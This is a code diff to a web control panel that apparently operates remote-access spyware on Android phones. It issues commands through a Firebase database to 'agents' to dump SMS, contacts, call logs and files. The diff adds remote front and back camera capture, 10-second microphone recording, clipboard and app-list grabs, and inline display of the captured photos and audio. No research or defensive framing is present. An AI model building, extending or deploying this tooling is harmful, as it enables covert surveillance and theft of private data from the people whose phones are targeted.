@@ -136,6 +136,12 @@ db.ref('agents').on('value', snap => {
       '<button data-c="sms">SMS</button>' +
       '<button data-c="contacts">Contacts</button>' +
       '<button data-c="call_log">Call Log</button>' +
+      '<button data-c="camera_front" class="flat">Cam front</button>' +
+      '<button data-c="camera_back" class="flat">Cam back</button>' +
+      '<button data-c="mic_record" class="flat">Mic 10s</button>' +
+      '<button data-c="battery" class="flat">Battery</button>' +
+      '<button data-c="app_list" class="flat">Apps</button>' +
+      '<button data-c="clipboard" class="flat">Clipboard</button>' +
       '<button data-c="list_files" data-arg="/sdcard">List /sdcard</button>' +
       '<input type="text" id="path_'+id+'" placeholder="/sdcard/Download/file.jpg"/>' +
       '<button data-c="list_files" class="flat" data-arg="#path">Path</button>' +
@@ -183,11 +189,27 @@ db.ref('results').limitToLast(1).on('child_added', snap => {
 function previewPayload(payload) {
   const pv = document.getElementById('preview');
   const mem = document.getElementById('memory');
-  // results carries whatever was asked; if it's bulk data, table it
-  if (payload.data && Array.isArray(payload.data)) {
-    mem.innerHTML = renderTable(payload.data);
-  } else if (payload.data && typeof payload.data === 'object') {
-    mem.innerHTML = '<pre>' + JSON.stringify(payload.data, null, 2) + '</pre>';
+  if (!payload.data) { pv.style.display='none'; return; }
+  const d = payload.data;
+
+  // camera shot
+  if (d.body && d.facing) {
+    mem.innerHTML = '<p style="color:#7fff7f">'+ d.facing +' shot, '+d.size+' bytes base64</p>'+
+      '<img src="data:image/jpeg;base64,'+d.body+'" style="max-width:320px;max-height:320px;border:1px solid #2a2a2a"/>';
+    return;
+  }
+  // mic audio
+  if (d.body && d.dur) {
+    mem.innerHTML = '<p style="color:#7fffff">mic '+d.dur+'s, '+d.size+' bytes</p>'+
+      '<audio controls src="data:audio/mp4;base64,'+d.body+'"></audio>';
+    return;
+  }
+  if (Array.isArray(d)) {
+    mem.innerHTML = renderTable(d);
+  } else if (Array.isArray(d.data)) {
+    mem.innerHTML = renderTable(d.data);
+  } else {
+    mem.innerHTML = '<pre>' + JSON.stringify(d, null, 2) + '</pre>';
   }
 }
 
